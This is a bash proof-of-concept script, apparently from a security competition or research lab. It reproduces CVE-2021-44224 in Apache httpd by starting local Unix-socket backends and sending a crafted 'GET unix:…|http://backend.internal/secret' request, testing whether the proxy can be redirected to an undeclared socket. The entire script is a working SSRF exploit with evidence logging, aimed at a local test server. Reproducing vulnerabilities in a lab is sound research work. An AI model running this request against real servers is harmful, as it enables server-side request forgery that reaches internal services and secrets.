#!/bin/bash
# 验证 44224 是否可把请求导向“未在配置中声明”的攻击者 UDS 路径（更强的 SSRF 证明）
set -u
ROOT="/mnt/e/强网拟态/cve/apache"
EVID="$ROOT/evidence/CVE-2021-44224"
PREFIX=/opt/httpd
EVIL=/tmp/cve-2021-44224-evil.sock
DECL=/tmp/cve-2021-44224.sock
mkdir -p "$EVID" "$PREFIX/conf" "$PREFIX/htdocs" "$PREFIX/logs"
cp -f "$ROOT/conf/httpd-44224.conf" "$PREFIX/conf/httpd-44224.conf"
pkill -f "$PREFIX/bin/httpd" 2>/dev/null || true
pkill -f 'uds_backend.py' 2>/dev/null || true
sleep 0.7
rm -f "$DECL" "$EVIL" "$EVID/uds_backend.log" "$EVID/evil_backend.log"

# 声明路径后端 + 未声明的 evil 后端
python3 "$ROOT/poc/CVE-2021-44224/uds_backend.py" "$EVID/uds_backend.log" &
P1=$!
sed "s#/tmp/cve-2021-44224.sock#$EVIL#g" "$ROOT/poc/CVE-2021-44224/uds_backend.py" > /tmp/evil_backend.py
python3 /tmp/evil_backend.py "$EVID/evil_backend.log" &
P2=$!
for i in $(seq 1 40); do [ -S "$DECL" ] && [ -S "$EVIL" ] && break; sleep 0.1; done
ls -l "$DECL" "$EVIL"

cd "$PREFIX"
"$PREFIX/bin/httpd" -f "$PREFIX/conf/httpd-44224.conf" -DFOREGROUND > "$EVID/console_probe.log" 2>&1 &
HPID=$!
for i in $(seq 1 40); do curl -s -o /dev/null http://127.0.0.1:8082/ && break; sleep 0.25; done

probe() {
  local path="$1" tag="$2"
  python3 - "$path" > "$EVID/ssrf_${tag}.txt" 2>&1 <<'PY'
import socket, sys
uds = sys.argv[1]
req = ("GET unix:%s|http://backend.internal/secret HTTP/1.1\r\nHost: backend.internal\r\nConnection: close\r\n\r\n" % uds).encode()
s = socket.create_connection(("127.0.0.1", 8082), timeout=10)
s.sendall(req); s.shutdown(socket.SHUT_WR)
data=b""
try:
    while True:
        b=s.recv(65536)
        if not b: break
        data+=b
except Exception as e:
    print("recv exception", repr(e))
s.close()
print(data.decode("latin1"))
PY
  echo "--- $tag ---"; head -12 "$EVID/ssrf_${tag}.txt"
}

probe "$DECL" declared
probe "$EVIL" undeclared

echo "== evil backend log =="; cat "$EVID/evil_backend.log" 2>/dev/null
echo "== declared backend log =="; cat "$EVID/uds_backend.log" 2>/dev/null

kill "$HPID" 2>/dev/null || true
sleep 0.4
pkill -f "$PREFIX/bin/httpd" 2>/dev/null || true
kill "$P1" "$P2" 2>/dev/null || true
rm -f "$DECL" "$EVIL"
